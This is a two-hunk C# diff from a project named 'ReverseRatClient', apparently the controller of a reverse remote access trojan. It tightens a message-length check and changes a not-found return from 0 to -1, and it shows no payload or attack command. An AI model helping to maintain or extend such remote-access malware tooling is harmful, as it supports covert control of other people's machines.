@@ -143,7 +143,7 @@ namespace ReverseRatClient
                              break;
                         }                        
                     }
-                    if (strInput.ToString().Length < 300)
+                    if (strInput.ToString().Length < 300 && strInput.ToString().Length > 2)
                         DisplayMessage(strInput.ToString());                   
 
                 }
@@ -287,7 +287,7 @@ namespace ReverseRatClient
                 if (dvg[4, j].Value.ToString().Trim() == hash)
                     return j;
             }
-            return 0;
+            return -1;
         }
 
 
